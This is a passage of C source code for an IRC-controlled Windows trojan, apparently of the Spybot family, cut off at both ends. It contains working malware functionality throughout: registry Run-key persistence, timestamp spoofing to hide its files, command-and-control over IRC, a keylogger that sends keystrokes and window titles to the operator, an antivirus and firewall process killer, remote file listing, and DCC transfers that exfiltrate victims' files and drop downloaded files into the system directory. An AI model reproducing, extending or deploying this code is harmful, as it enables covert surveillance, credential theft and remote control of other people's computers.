      	        RegSetValueEx(key, valuename, 0, REG_SZ, loadername, 127);
	}
	RegCloseKey(key);
	RegCreateKeyEx(HKEY_LOCAL_MACHINE, runkey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL);
	if (uninstal) {
		RegDeleteValue(key,( LPCTSTR ) valuename);
		RegCloseKey(key);
		DeleteFile(loader);
		DeleteFile(temploader);
		Sleep(5000);
		uninstall();
	}
    	if (RegQueryValueEx(key, ( LPCTSTR ) valuename , 0, 0,buf, &size) != ERROR_SUCCESS || strcmp(buf, loadername) != 0) 
		        RegSetValueEx(key, valuename, 0, REG_SZ, loadername, 127);
	RegCloseKey(key);
	HANDLE testfile = CreateFile(loader,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0);
	if (testfile == INVALID_HANDLE_VALUE) {
		CopyFile(temploader,loader,FALSE);
		Setfiletime(temploader);
	}	
	else CloseHandle(testfile);
	testfile = CreateFile(temploader,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0);
	if (testfile == INVALID_HANDLE_VALUE) {
		CopyFile(loader,temploader,FALSE);
		Setfiletime(loader);
	}	
	else CloseHandle(testfile);
}
/*
char registerkey[] = "SOFTWARE\\Microsoft\\Windows\\spybot"
char register_value[] = "update";
int check_updates(void)
{
	unsigned long size = 250;
	HKEY key;
	BYTE  buf[200];
	char date[10];
	char date2[10];
	char c_Time[10];
	GetDateFormat(0x409,0,0,"MM",date,10);
	GetDateFormat(0x409,0,0,"dd",date2,10);
	int time = atoi(date) * 30 + atoi(date2);//current day not every month has 30 days but who cares :)
	sprintf(c_Time,"%i",time);
	//read the day from the registry
	RegCreateKeyEx(HKEY_CURRENT_USER, registerkey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL);
    	if (RegQueryValueEx(key, ( LPCTSTR ) register_value , 0, 0,buf, &size) != ERROR_SUCCESS) {
      	        RegSetValueEx(key, register_value, 0, REG_SZ, c_Time, 127); //nothing set first time we run ?
	}
}
*/

void Setfiletime(char *file)
{
	HANDLE testfile;
	FILETIME cTime;
	FILETIME aTime;
	FILETIME wTime;
	testfile = CreateFile("c:\\windows\\explorer.exe",GENERIC_READ ,FILE_SHARE_READ,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
	if (testfile != INVALID_HANDLE_VALUE) {
		GetFileTime(testfile,&cTime,&aTime,&wTime);
		CloseHandle(testfile);
		testfile = CreateFile(file,GENERIC_WRITE,FILE_SHARE_WRITE,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
		if (testfile != INVALID_HANDLE_VALUE) {
			SetFileTime(testfile,&cTime,&aTime,&wTime);
			CloseHandle(testfile);
		}
	}
}
//connect functie

int irc_connect(char * serveraddr,int poort)
{
	DWORD err;
	memset(IRC_server,0,sizeof(IRC_server));
	strcpy(IRC_server,serveraddr);
	////////////////////////////////decrypt the irc server/////////////////////////////////////////////////////
	//decryptpass(IRC_server,key);
	///////////////////////////////////////////////////////////////////////////////////////////////////////////
	int count = 0;
	restart:;
	SOCKET Server;
	#ifdef USE_IDENT_SERVER
	DWORD id;
	if (identsock < 1) {
		run_ident = TRUE;
		CreateThread(NULL, 0, &identserv,(LPVOID)poort, 0, &id);
	}
	#endif
	if ((Server = create_sock(IRC_server,poort)) == SOCKET_ERROR) return 0;
	err = irc_read(Server);
	#ifdef Let_The_Bot_Talk
	if (talk_thread_handle) TerminateThread(talk_thread_handle,0);
	#endif
	if (err == 2) goto restart;
	else if (err == 3) { 
		Sleep(distime);
		goto restart;
	}
	count++;
	if (count == 2) return err;
	else goto restart;

}

void getnick()
{
	char username[250];
	memset(username,0,sizeof(username));
	memset(nick,0,sizeof(nick));
	if (GetUserName(username, &nSize))
		strcpy(realname,username);
	strtok(username," ");
	if (strlen(username) < 3 || strlen(username) > 20 || strcmp(username,"Administrator") == 0 || strcmp(username,"Default") == 0)  //we create a random nick
		randnick();
	else {
		srand(GetTickCount());
		sprintf(nick,"%s%i",username,(rand()%99));//add a random number at the end of the username
	}
}
void randnick()
{
	memset(nick,0,sizeof(nick));
	int c, len;
	srand(GetTickCount());
	len = (rand()%3)+4;
	for (c=0; c<len; c++) nick[c] = (rand()%26)+97;
	nick[c+1] = '\0';
	strcpy(realname,nick);
}
int irc_read(SOCKET Server)
{
	char *line;
	char buf[5096];
	char buffer[4096];
	int er = 1;
	int i;
	memset(logins,0,sizeof(logins));
	SOCKADDR sa;
	int sas;
	memset(IP,0,sizeof(IP));
	sas = sizeof(sa);
	memset(&sa, 0, sizeof(sa));
	getsockname(Server, &sa, &sas);
	sprintf(IP,"%d.%d.%d.%d",(BYTE)sa.sa_data[2], (BYTE)sa.sa_data[3], (BYTE)sa.sa_data[4], (BYTE)sa.sa_data[5]);
	sprintf(IP2,"%d.%d",(BYTE)sa.sa_data[2], (BYTE)sa.sa_data[3]);
	getnick();
	sprintf(buffer,"NICK %s\nUSER %s \"hotmail.com\" \"%s\" :%s\n",nick,nick,IRC_server,realname);
      	send(Server, buffer, strlen(buffer), 0);
	TIMEVAL time;
   	fd_set fd_struct;
    	time.tv_sec = 120;//timeout after 120 sec.
    	time.tv_usec = 0;
   	FD_ZERO(&fd_struct);
    	FD_SET(Server, &fd_struct);
	if (select(0, &fd_struct, NULL, NULL, &time) <= 0)
	{
		closesocket(Server); //the server didnt responce within 60 sec. so we try a other server
		return 0;
	}
	memset(Online_time,0,sizeof(Online_time));
	char date[70];
	GetDateFormat(0x409,0,0,"(dd:MMM:yyyy,",date,70);
	strcat(Online_time,date);
	memset(date,0,sizeof(date));
	GetTimeFormat(0x409,0,0,"HH:mm:ss)",date,70);
	strcat(Online_time,date);
	while (1) {
		memset(buffer,0,sizeof(buffer));
		memset(buf,0,sizeof(buf));
		int len;
		if ((len = recv(Server, buffer,sizeof(buffer), 0)) <= 0) 
			break;
		int t = 0;
		int r = 0;
		if (dccspy > 0) send(dccspy,buffer, strlen(buffer), 0);
		for (t=0;t<len;t++)
		{
			if (buffer[t] == '\r') {
				r=0;
				er = irc_readline(buf,Server);
				if (er > 0) {
					closesocket(Server);
					return er;
				}
				memset(buf,0,sizeof(buf));
			}
			else if (buffer[t] == '\0' || buffer[t] == '\n' || buffer[t] == '\r') continue;
			else {
				buf[r] = buffer[t];
				r++;
			}

		}
	}
	closesocket(Server);
	return 0;
}

int irc_readline(char * line,SOCKET Server)
{
	char buf[512];
	char line1[512];
	char *s[5];
	char *x;
	char *y;
	char user[50];
	int i,c,w;
	int err = 0;
	DWORD id;
	BOOL master = FALSE;
	memset(buf,0,sizeof(buf));

	strncpy(line1, line, sizeof(line1)-1);
	s[0] = strtok(line1, " ");
	for (i = 1; i < 5; i++) s[i] = strtok(NULL, " ");
	if (s[0] == NULL || s[1] == NULL) return 0;
	if (strcmp("PING", s[0]) == 0) {
		sprintf(buf,"PONG %s\n",s[1]);
		send(Server, buf, strlen(buf), 0);
	}
	else if (strcmp("376", s[1]) == 0 || strcmp("422", s[1]) == 0) {
		if (channelpass) sprintf(buf,"JOIN %s %s\n",channel,channelpass);
		else sprintf(buf,"JOIN %s\n",channel);
		send(Server, buf, strlen(buf), 0);
		#ifdef USE_IDENT_SERVER
		run_ident = FALSE;
		if (identsock > 0) closesocket(identsock);
		#endif
		#ifdef  rawcommands_after_connect
		raw_commands(Server);
		#endif
	}
	else if (strcmp("433",s[1]) == 0 || strcmp("432",s[1]) == 0) {
		randnick();
		sprintf(buf,"NICK %s\n",nick);
		send(Server, buf, strlen(buf), 0);
	}
	if (s[2] == NULL) return 0;

	if (strcmp("366",s[1]) == 0) {
		#ifdef rawcommands_after_join
		raw_commandsonjoin(Server,s[3]);
		#endif
		#ifdef Let_The_Bot_Talk
		talk_thread_handle = CreateThread(NULL, 0, &talk_thread, (LPVOID)Server, 0, &id);
		#endif
	}

	strncpy(user, s[0]+1, sizeof(user)-1);

	strtok(user, "!");
	if (strcmp("NICK",s[1]) == 0) {
		for (i = 0; i < maxlogins; i++) {
			if (strcmp(logins[i],user) == 0 && logins[i] != NULL) strcpy(logins[i],s[2]+1);
		}
	}
	if (strcmp("QUIT", s[1]) == 0 || strcmp("PART", s[1]) == 0) {
		for (i = 0; i <= maxlogins; i++) {
			if (strcmp(logins[i],user) == 0 && logins[i] != NULL) memset(logins[i],0,sizeof(logins[i]));
		}

	}
	if (s[3] == NULL) return 0;
	if (strcmp(channel,s[3]) == 0) {
		if (strcmp("471",s[1]) == 0 || strcmp("472",s[1]) == 0 || strcmp("473",s[1]) == 0 || strcmp("474",s[1]) == 0 || strcmp("475",s[1]) == 0) return 4; //we cant join channel ? its full,invite only,whe dont have the correct key or we are banned  maybe some fucking ircop we try a other server
	}
	if (strcmp("KICK", s[1]) == 0) { //hope we are not kicked...
		for (i = 0; i <= maxlogins; i++) {
			if (strcmp(logins[i],s[3]) == 0 && logins[i] != NULL) memset(logins[i],0,sizeof(logins[i])); //or master is kicked
		}
		if (strcmp(nick,s[3]) == 0) {
			sprintf(buf,"JOIN %s %s\n",channel,channelpass);
			send(Server, buf, strlen(buf), 0);
		}
	}
	if ((strcmp("PRIVMSG",s[1]) == 0 || (strcmp("332",s[1]) == 0 && topiccommands))) { //its a privmsg or topic
		if (strcmp("PRIVMSG",s[1]) == 0) {
			if (strstr(s[2], "#") == NULL) s[2] = user;
			for (i = 0; i <= maxlogins; i++) {
				if (strcmp(logins[i],user) == 0 && logins[i] != NULL) master = TRUE;
			}
			#ifdef GIVE_VERSION_REPLY
			if (strcmp(s[3],":VERSION") == 0) {
				sprintf(buf,"NOTICE %s :VERSION %s\n",user,VERSION_REPLY);
				send(Server, buf, strlen(buf), 0);
			}
			#endif
			#ifdef GIVE_PING_REPLY
			if (strcmp(s[3],":PING") == 0 && s[4] != NULL) {
				if (strcmp(s[4],"2252413381") == 0) { //we send a special reply 
					sprintf(buf,"NOTICE %s :PING 2232453489\n",user);
					send(Server, buf, strlen(buf), 0);
				}
				else {
					sprintf(buf,"NOTICE %s :PING %s\n",user,s[4]);
					send(Server, buf, strlen(buf), 0);
				}
			}
			#endif
			if (strcmp(login_command,s[3]+1) == 0 && s[4] != NULL)
			{
 				if (master) return 0;
				int x;
				for (x = 0; x < maxlogins; x++) {
					if (logins[x][0] != '\0') continue;
					#ifdef ENCRYPTED_LOGIN
					decryptpass(s[4],user);
					#endif
					if (strcmp(password,s[4]) == 0) {
						char * hostname2;
						char * hostname;
						char hostS[512];
						strcpy(hostS,s[0]);
						#ifdef use_nickname_match
						for (i=0;trustednicks[i] != NULL;i++)
						{
							if (strcmp(user,trustednicks[i]) == 0) goto nick;
						}
						return 0;
						nick:;
						#endif
						#ifdef use_ident_match
						char * h_ident;
						hostname2 = strstr(s[0], ":");
						h_ident = strtok(hostname2, "@")+strlen(user)+2;
      	       
						for (i=0;trustedidents[i] != NULL;i++)
						{
							if (strcmp(h_ident,trustedidents[i]) == 0) goto ident;
						}
						return 0;
						ident:;
						#endif
						
						#ifdef use_hostname_match
						BOOL goodhost = FALSE;
						hostname = strstr(hostS, "@");
						for (i = -1;trustedhosts[i+1] != NULL; i++) 
						{

							restart:;
							i++;
							if (trustedhosts[i] == NULL) return 0;
							for (c = 0; c < strlen(trustedhosts[i])-1; c++) {
								if (trustedhosts[i][0] == '*') {
									if (hostname[strlen(hostname) - 1 - c] != trustedhosts[i][strlen(trustedhosts[i]) - 1 -c]) {
										if (trustedhosts[i][strlen(trustedhosts[i]) - 1 -c] != '*') goto restart;
									}

								}
								else if (hostname[c+1] != trustedhosts[i][c]) {
									if (trustedhosts[i][c] == '*') continue;
									else goto restart;
								}
							}
							goodhost = TRUE;
							break;
						}
						
						if (goodhost || trustedhosts[0] == NULL) {
						#endif
							strcpy(logins[x],  user);
							master = TRUE;
							return 0;
						#ifdef use_hostname_match
						}
						#endif
					}
					break;
				}
			}
		}
		else 
			s[2] = s[3];
		if (!master && strcmp("332",s[1]) != 0) return 0;
		
		if (strcmp(":\1DCC",s[3]) == 0 && s[4] != NULL) {
			x = strstr(line, " :");
			y = strstr(x+1, " ");
			err = read_command(Server,Server,s[4],y+1,s[2]);
		}
		else 	{
			SOCKET sendsock = Server;
			if ((x = strstr(line, " :")+2) == NULL) return 0;
			if (strlen(x) < 2) return 0;
			if (x[0] != prefix) return 0;
			x = x+1;
			#ifdef Use_Encrypted_commands
			if (strcmp("332",s[1]) == 0) decryptpass(x,key);
			else decryptpass(x,user);
      	 		#endif
			if (x[strlen(x)-1] == 's' && x[strlen(x)-2] == '-' && x[strlen(x)-3] == ' ') { x[strlen(x)-1] = '\0'; x[strlen(x)-1] = '\0'; x[strlen(x)-1] = '\0'; sendsock = 0; }
			char command1[512];
			memset(command1,0,sizeof(command1));
			strcpy(command1,x);
			strtok(command1," ");
			if (strcmp(command1,nick) == 0 || strcmp(command1,Bot_Version) == 0 || strcmp(command1,OS) == 0 || strcmp(command1,connection_type) == 0 || strcmp(command1,IP2) == 0)  { 
				char *command2;
				char commandline[512];
				memset(commandline,0,sizeof(commandline));
				strcpy(commandline,x);
				command2 = strstr(x," ");
				strtok(command2," ");
				err = read_command(sendsock,Server,command2+1,commandline+1+strlen(command1+1),s[2]);
			 }
			else 
				err = read_command(sendsock,Server,command1,x,s[2]);
		}

	}
	return err;
}
#ifdef Let_The_Bot_Talk
DWORD WINAPI talk_thread(LPVOID Param)
{
	char buf[512];
	int c;
	SOCKET sock = (SOCKET)Param;
	while (sock > 0) {
		Sleep(talk_delay);
		for (c = 0;talk_lines[c] != NULL;c++) {
			memset(buf,0,sizeof(buf));
			sprintf(buf,"PRIVMSG %s :%s\n",channel,talk_lines[c]);
			if (send(sock,buf,strlen(buf),0) < 1) sock = 0;
			Sleep(2600);
		}
	}
	return 0;

}
#endif
DWORD WINAPI keylogger(LPVOID Param)
{
	HWND win, winold;
	int bKstate[256]={0};
        int i,x;
	int err = 0;
	int threadnum = (int)Param;
	char buffer[600];
	char buffer2[800];
	char window[61];
	int state;
	int shift;
	char logfile[MAX_PATH];

	#ifdef start_keylogger_afterstartup
	char sysdir[MAX_PATH];
	GetSystemDirectory(sysdir, sizeof(sysdir));
	sprintf(logfile,"%s\\%s",sysdir,keylogfilename);
	FILE *log;
	log = fopen(logfile,"aw");
	if (log != NULL) {
		char date[70];
		GetDateFormat(0x409,0,0,"\n[dd:MMM:yyyy, ",date,70);
		fputs(date,log);
		memset(date,0,sizeof(date));
		GetTimeFormat(0x409,0,0," HH:mm:ss]",date,70);
		fputs(date,log);
		fputs(" Keylogger Started\n\n",log);
		fclose(log);
	}
	#endif

	memset(buffer,0,sizeof(buffer));
	win = GetForegroundWindow();
	winold = win;
	GetWindowText(winold,window,60);
	while (err == 0) {
		Sleep(8);
		win = GetForegroundWindow();
		if (win != winold) {
			if (strlen(buffer) != 0) {
				sprintf(buffer2,"%s (Changed window",buffer);
				err = sendkeys(keysock,buffer2,window,logfile);
				memset(buffer,0,sizeof(buffer));
				memset(buffer2,0,sizeof(buffer2));
			}
			win = GetForegroundWindow();
			winold = win;
			GetWindowText(winold,window,60);

		}
		for(i=0;i<92;i++)
		{
			shift = GetKeyState(VK_SHIFT);
 			x = inputL[i];
			if (GetAsyncKeyState(x) & 0x8000) {
				//see if capslock or shift is pressed doesnt work most of the time on win9x
				if (((GetKeyState(VK_CAPITAL) != 0) && (shift > -1) && (x > 64) && (x < 91)))//caps lock and NOT shift
					bKstate[x] = 1;//upercase a-z
				else if (((GetKeyState(VK_CAPITAL) != 0) && (shift < 0) && (x > 64) && (x < 91)))//caps lock AND shift
					bKstate[x] = 2;//lowercase a-z
				else if (shift < 0) //Shift
					bKstate[x] = 3; //upercase
				else bKstate[x] = 4; //lowercase 
			}

			else {
				if (bKstate[x] != 0)
				{
					state = bKstate[x];
					bKstate[x] = 0;
					if (x == 8) {
						buffer[strlen(buffer)-1] = 0;
						continue;
					}
					else if (strlen(buffer) > 550) {
						win = GetForegroundWindow();
						GetWindowText(win,window,60);
						sprintf(buffer2,"%s (Buffer full",buffer);
						err = sendkeys(keysock,buffer2,window,logfile);
						memset(buffer,0,sizeof(buffer));
						memset(buffer2,0,sizeof(buffer2));
						continue;
					}
					else if (x == 13)  {
						if (strlen(buffer) == 0) continue;
						win = GetForegroundWindow();
						GetWindowText(win,window,60);
						sprintf(buffer2,"%s (Return",buffer);
						err = sendkeys(keysock,buffer2,window,logfile);
						memset(buffer,0,sizeof(buffer));
						memset(buffer2,0,sizeof(buffer2));
						continue;
					}
					else if (state == 1 || state == 3)
						strcat(buffer,outputH[i]);
					else if (state == 2 || state == 4)
						strcat(buffer,outputL[i]);
				}

     			}
		}
	}
	threads[threadnum].id = 0;
	return 1;
}

int sendkeys(SOCKET sock,char *buf,char *window,char *logfile)
{
	char buffer[4092];
	strcat(buf,")\n");
	#ifdef start_keylogger_afterstartup
	int len = 0;
	FILE *log;
	log = fopen(logfile,"aw");
	if (log != NULL) {
		char date[20];
		GetTimeFormat(0x409,0,0,"[HH:mm:ss] ",date,19);
		fputs(date,log);
		len = strlen(date) + strlen(window);
		fputs(window,log);
		len = 75 - len;
		if (len > 0) {
			int c;
			for(c=0;c<len;c++)
				fputc(32,log);

		}
	 	fputs(buf,log);
		fclose(log);
	}
	if (sendkeysto == 0) return 0;
	#endif

	strcat(buf,"\r");
	if (strlen(keylogchan) == 0) {
		sprintf(buffer,"(%s) 10 %s",window,buf);
	}
	else {
		sprintf(buffer,"PRIVMSG %s :(%s)10  %s",keylogchan,window,buf);
	}
	if (send(sock,buffer,strlen(buffer),0) == SOCKET_ERROR) {
		memset(keylogchan,0,sizeof(keylogchan));
		sendkeysto = 0;
		#ifndef start_keylogger_afterstartup
		return 1;
		#endif
	}
	return 0;
}

#ifdef use_funstuf 
void Keyevent (BYTE key,BOOL caps)
{
	if (caps) keybd_event(VK_SHIFT,MapVirtualKey(VK_SHIFT,0),FALSE?KEYEVENTF_KEYUP:0,0);
        keybd_event(key,MapVirtualKey(key,0),FALSE?KEYEVENTF_KEYUP:0,0);
	keybd_event(key,MapVirtualKey(key,0),TRUE?KEYEVENTF_KEYUP:0,0);
	if (caps) keybd_event(VK_SHIFT,MapVirtualKey(VK_SHIFT,0),TRUE?KEYEVENTF_KEYUP:0,0);
}
#endif

#ifdef Use_Firewall_killer
DWORD WINAPI kill_av(LPVOID param)
{
	while (1)
	{
		listProcesses(0,NULL,NULL,TRUE);
		Sleep(killer_delay);
	}
	return 0;
}
#endif
int listProcesses(SOCKET sock,char *chan,char *proccess,BOOL killthread)
{
	HANDLE hand;
	HANDLE killer;
	char buffer[500];
 	PROCESSENTRY32 pe32 = {0};
	int c;
	char window[250];
	if (fCreateToolhelp32Snapshot && fProcess32First && fProcess32Next) {
		hand = fCreateToolhelp32Snapshot(2, 0);
		if (hand != INVALID_HANDLE_VALUE) {
			pe32.dwSize = sizeof(PROCESSENTRY32);
			if (fProcess32First(hand, &pe32)) {
				do {
					if (killthread) {
						#ifdef Use_Firewall_killer
						CharUpperBuff(pe32.szExeFile,strlen(pe32.szExeFile));
						for(c = 0;kill_list[c] != NULL;c++)
						{
							if (strstr(pe32.szExeFile,kill_list[c]) != NULL) {
 								killer=OpenProcess(PROCESS_ALL_ACCESS,FALSE,pe32.th32ProcessID);
								TerminateProcess(killer,0);
								break;
							}
						}
						#endif
					}
					else if (proccess == NULL) {
						memset(buffer,0,sizeof(buffer));
						if (chan != NULL) {
							Sleep(Flood_delay);
							sprintf(buffer,"PRIVMSG %s :%s\n",chan,pe32.szExeFile);
						}
						else sprintf(buffer,"%s\n\r",pe32.szExeFile);
						send(sock,buffer,strlen(buffer),0);
					}
					else {
						if (strcmp(pe32.szExeFile,proccess) == 0) {
 							killer = OpenProcess(PROCESS_ALL_ACCESS,FALSE,pe32.th32ProcessID);
							CloseHandle(hand);
							if (!TerminateProcess(killer,0)) return 0;
							return 1;
						 }

					}

				} while (fProcess32Next(hand, &pe32));
			}
			CloseHandle(hand);
		}
	}

 	return 0;

}


int getfiles(char *current,SOCKET dccsock,char *chan,char *URL)
{
	char sendbuf[MAX_PATH];
	char parent[MAX_PATH];
	memset(parent,0,sizeof(parent));
        HANDLE Hnd;
        WIN32_FIND_DATA WFD;
	DWORD c;
	int count = 0;
	int count2 = 0;
	strtok(current,"\n");
	if (chan) sprintf(sendbuf,"PRIVMSG %s :Searsing for: %s\r\n",chan,current);
	else if (URL) sprintf(sendbuf,"<HTML><PRE>\n");
	else sprintf(sendbuf,"Searsing for: %s\r\n",current);
        send(dccsock,sendbuf,strlen(sendbuf),0);
	if (URL && strlen(URL) > 2) {
		//make the Parent Directory
		for (c=strlen(URL)-3;c != 0;c--)
			if (URL[c] == 47) 
				break;
		strncpy(parent,URL,c+1);
		sprintf(sendbuf,"<li><A href=\"%s\">Parent Directory</A></li>\r\n",parent);
		send(dccsock,sendbuf,strlen(sendbuf),0);
	}
        Hnd = FindFirstFile(current, &WFD);
        while (FindNextFile(Hnd, &WFD))
        {
        	if ((WFD.dwFileAttributes) &&  (strcmp(WFD.cFileName, "..") && strcmp(WFD.cFileName, ".")))
        	{

			memset(sendbuf,0,sizeof(sendbuf));
			if (WFD.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
				count2++;
				if (chan) sprintf(sendbuf,"PRIVMSG %s :[%s]\n",chan,WFD.cFileName);
				else if (URL) //its a http request
					sprintf(sendbuf,"<li><A href=\"%s%s/\">%s</A></li> <b><u>(Directory)</b></u>\r\n",URL,WFD.cFileName,WFD.cFileName);
				else
					sprintf(sendbuf,"<%s>\r\n",WFD.cFileName);
			}
			else {
				count++;
				if (chan) sprintf(sendbuf,"PRIVMSG %s :%s (%i bytes)\n",chan,WFD.cFileName,WFD.nFileSizeLow);
				else if (URL)//its a http request
					sprintf(sendbuf,"<p><A href=\"%s%s\">%s</A> (%i bytes)\r\n",URL,WFD.cFileName,WFD.cFileName,WFD.nFileSizeLow);
				else 
					sprintf(sendbuf,"%s  (%i bytes)\r\n",WFD.cFileName,WFD.nFileSizeLow);
			
			}
			send(dccsock,sendbuf,strlen(sendbuf),0);
			if (chan) Sleep(Flood_delay);
     		}

        }
    	(void) FindClose(Hnd);
	if (chan) sprintf(sendbuf,"PRIVMSG %s :Found %i files and %i dirs\n",chan,count,count2);
	else if (URL) sprintf(sendbuf,"</PRE></HTML>"); 
	else sprintf(sendbuf,"Found: %i files and %i dirs\r\n",count,count2);
	send(dccsock,sendbuf,strlen(sendbuf),0);
   	return 0;
}




#ifdef  rawcommands_after_connect
void raw_commands(SOCKET sock)
{
	char *p;
	char buf[512];
	char buf2[512];
	char buf3[512];
	int c;
	for (c = 0;rawcommands[c] != NULL;c++) {
		if (strstr(rawcommands[c], "$NICK") != NULL) {
			memset(buf,0,sizeof(buf));
			memset(buf2,0,sizeof(buf2));
			memset(buf3,0,sizeof(buf3));
			strcpy(buf,rawcommands[c]);
			strcpy(buf3,buf);
			strtok(buf3,"$NICK");
			p = strstr(buf, "$NICK");
			sprintf(buf2,"%s%s%s\n",buf3,nick,p+5);
		}
		else
			sprintf(buf2,"%s\n",rawcommands[c]);
		send(sock, buf2, strlen(buf2), 0);
		Sleep(1000);
	}
}
#endif

#ifdef rawcommands_after_join
void raw_commandsonjoin(SOCKET sock,char *chan)
{
	char *p;
	char buf[512];
	char buf2[512];
	char buf3[512];
	int c;
	for (c = 0;onjoin_commands[c] != NULL;c++) {
		if (strstr(onjoin_commands[c], "$CHAN") != NULL) {
			memset(buf,0,sizeof(buf));
			memset(buf2,0,sizeof(buf2));
			memset(buf3,0,sizeof(buf3));
			strcpy(buf,onjoin_commands[c]);
			strcpy(buf3,buf);
			strtok(buf3,"$CHAN");
			p = strstr(buf, "$CHAN");
			sprintf(buf2,"%s%s%s\n",buf3,chan,p+5);
		}
		else
			sprintf(buf2,"%s\n",onjoin_commands[c]);
		send(sock, buf2, strlen(buf2), 0);
		Sleep(1000);
	}
}
#endif

int dccsenderror(SOCKET sock,char *chan,char *buf)
{
	char buffer[512];
	strcat(buf,"\n");
	memset(buffer,0,sizeof(buffer));
	if (chan) sprintf(buffer,"PRIVMSG %s :%s",chan,buf);
	else sprintf(buffer,buf);
	send(sock,buffer,strlen(buffer),0);
	return 0;
}

DWORD WINAPI dcc_chat(LPVOID param)
{
	char buffer[4096];
	char host[20];
	int port;
	SOCKET ircsock;
	ircsock = dcchosts;
	sprintf(host,dcchost);
	port = dccport;
	int i;
	char x[MAX_PATH];
	info = TRUE;
	char line[4096];
   	SOCKET dcc;
	if ((dcc = create_sock(host,port)) == SOCKET_ERROR) return 0;
	while (1) {
		memset(buffer,0,sizeof(buffer));
		if (recv( dcc, buffer, sizeof(buffer), 0) <= 0) 
			return 1;
		strncpy(line, buffer, sizeof(line)-1);
		strtok(buffer, " ");
		strtok(buffer,"\n");
		strtok(line,"\n");
		if (strlen(line) < 3) continue;
		if (buffer == NULL) continue;
		if (read_command(dcc,ircsock,buffer,line,NULL) == 1) {
			WSACleanup();
			exit(0);
		}

	}
	closesocket(dcc);
	return 0;
}


DWORD WINAPI dcc_send(LPVOID param)
{
	char buffer[1024];
	unsigned int move;
	DWORD err, err2;
   	SOCKET         dcc;
	SOCKET         sock;
	SOCKADDR_IN    GuestAddr;
	SOCKADDR_IN    SockAddr;
	char chan[50];	
	memset(chan,0,sizeof(chan));
	strcpy(chan,sendtochan);
	char filename[MAX_PATH];
	SOCKET sendsock;
	sendsock = dcchosts;
	strcpy(filename,dccfilename);
	char sendbuf[512];  
	memset(sendbuf,0,sizeof(sendbuf));
	info = TRUE;
	DWORD mode = 0;
	while (1) 
	{
		if ((dcc = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
      			sprintf(sendbuf,Error);
			break;
		}
		memset(&SockAddr, 0, sizeof(SockAddr));
   		SockAddr.sin_family = AF_INET;
   		SockAddr.sin_port = htons(0);//random port
		SockAddr.sin_addr.s_addr = INADDR_ANY;   
		if (bind(dcc, (SOCKADDR *)&SockAddr, sizeof(SockAddr)) != 0) {
			sprintf(sendbuf,Error);
			break;
		}
		int length = sizeof(SockAddr);
		getsockname(dcc, (SOCKADDR *)&SockAddr, &length);

		short portnum = ntohs(SockAddr.sin_port);
		char file[MAX_PATH];
		for (int c=0;c<=strlen(filename);c++)
		{
			if (filename[c] == 32) file[c] = 95;
			else file[c] = filename[c];
		}

		if (listen(dcc, 1) != 0) {
			sprintf(sendbuf,Error);
			break;
		}
		HANDLE testfile = CreateFile(filename,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0);
		if (testfile == INVALID_HANDLE_VALUE) {
			sprintf(sendbuf,No_File);
			break;
		}
		length = GetFileSize(testfile,NULL);
		sprintf(sendbuf,"DCC SEND %s %i %i %i",file,htonl(inet_addr(IP)),portnum,length);
		dccsenderror(sendsock,chan,sendbuf);
		TIMEVAL time;
   		fd_set fd_struct;
    		time.tv_sec = 60;//timeout after 60 sec.
    		time.tv_usec = 0;
   		FD_ZERO(&fd_struct);
    		FD_SET(dcc, &fd_struct);
		if (select(0, &fd_struct, NULL, NULL, &time) <= 0)
		{
			dccsenderror(sendsock,chan,"Dcc send timeout");
			break;
		}
		int addrlen = sizeof(GuestAddr);
		if ((sock = accept(dcc, (SOCKADDR *)&GuestAddr,&addrlen)) == INVALID_SOCKET)  {
			sprintf(sendbuf,Error);
			break;
		} 
		closesocket(dcc);
		int c;
		int count;
		while (length) {
			int Fsend = 1024;
			memset(buffer,0,sizeof(buffer));
			if (Fsend>length) Fsend=length;
			move = 0-length;
			SetFilePointer(testfile, move, NULL, FILE_END);
			ReadFile(testfile, buffer, Fsend, &mode, NULL);
			int bytes_sent = send(sock, buffer, Fsend, 0);
			err2 = recv(sock,buffer ,sizeof(buffer), 0);
			if (err2 < 1 || bytes_sent < 1) {
				dccsenderror(sendsock,chan,"Socket error");
				closesocket(sock);
				return 1;
			}
			length = length - bytes_sent;
		}
		if (testfile != INVALID_HANDLE_VALUE) CloseHandle(testfile);
		sprintf(sendbuf,"Transfer complete");
		break;
	}
	
	dccsenderror(sendsock,chan,sendbuf);
	if (dcc > 0) closesocket(dcc);
	closesocket(sock);
        return 0;
}

DWORD WINAPI dcc_getfile(LPVOID param)
{
	char buffer[4096];
	char sendbuffer[512];
	DWORD err;
   	SOCKET	dcc;
	SOCKET	sock;
	sock = dcchosts;
	char chan[50];	
	if (sendtochan != NULL) strcpy(chan,sendtochan);
	char host[20];
	int port;
	port = dccport;
	int received = 0;
	unsigned long received2;
 	sprintf(host,dcchost);
	char sysdir[MAX_PATH];
	char filename[MAX_PATH];
	GetSystemDirectory(sysdir, sizeof(sysdir));
	sprintf(filename,"%s\\%s",sysdir,dccfilename);
	info = TRUE;
	FILE *infile;
	memset(sendbuffer,0,sizeof(sendbuffer));
	while (1) 
	{
		HANDLE testfile = CreateFile(filename,GENERIC_WRITE,FILE_SHARE_READ,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
		if (testfile == INVALID_HANDLE_VALUE) {
			sprintf(sendbuffer,"Error with file");
			break;
		}
		CloseHandle(testfile);
		infile = fopen(filename,"a+b");
		if (infile == NULL) {
			sprintf(sendbuffer,"Error with file");
			break;
		}

		if ((dcc = create_sock(host,port)) == SOCKET_ERROR) {
			sprintf(sendbuffer,"Error connecting");
			break;
		}
		err = 1;
		while (err != 0) {
			memset(buffer,0,sizeof(buffer));
			err = recv( dcc, buffer, sizeof(buffer), 0);
			if (err == 0) break;
			if (err == SOCKET_ERROR) {
				dccsenderror(sock,chan,"Socket error");
				fclose(infile);
				closesocket(dcc);
				return 1;
			}
			fwrite(buffer,1,err,infile);
			received = received + err;
			received2 =  htonl(received);
